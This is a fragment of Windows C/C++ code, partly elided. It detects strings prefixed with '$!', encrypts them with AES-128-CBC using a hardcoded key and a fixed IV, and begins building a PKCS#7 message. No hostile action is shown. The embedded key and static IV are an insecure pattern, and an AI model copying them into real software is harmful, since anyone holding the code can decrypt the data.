                ...
                if (szCheck[0] == L'$' && szCheck[1] == L'!')
                {
                    ...
                    if (i < 255)
                    {
                        ...
                        RpcTryExcept
                        {
                            ...
                            cbContent = wcslen(szCheck + 2)*sizeof(WCHAR);
                            cbContent += 16 - (cbContent % 16);//padding to 16
                            pbContent = (PBYTE)malloc(cbContent * 2);
                            ZeroMemory(pbContent, cbContent * 2);
                            BYTE tmp[sizeof(szCheck)];
                            ZeroMemory(tmp, sizeof(szCheck));
                            memcpy_s(tmp, sizeof(szCheck), szCheck + 2, wcslen(szCheck + 2)*sizeof(WCHAR));
                            uint8_t key[16] = {0x19,0x97,0x02,0x08,0x19,0x94,0x06,0x27,0x19,0x56,0x20,0x16,0xde,0xad,0xbe,0xef};
                            uint8_t iv[16] = { 0x00,0x02,0x04,0x06,0x08,0x0a,0x0c,0x0e,0x01,0x03,0x05,0x07,0x09,0x0b,0x0d,0x0f };
                            AES128_CBC_encrypt_buffer(pbContent,tmp, cbContent, key, iv);
                            //-------------------------------------------------------------------
                            // Get the size of the encoded message BLOB.

                            cbEncodedBlob = CryptMsgCalculateEncodedLength(
                                PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,       // message encoding type
                                0,                      // flags
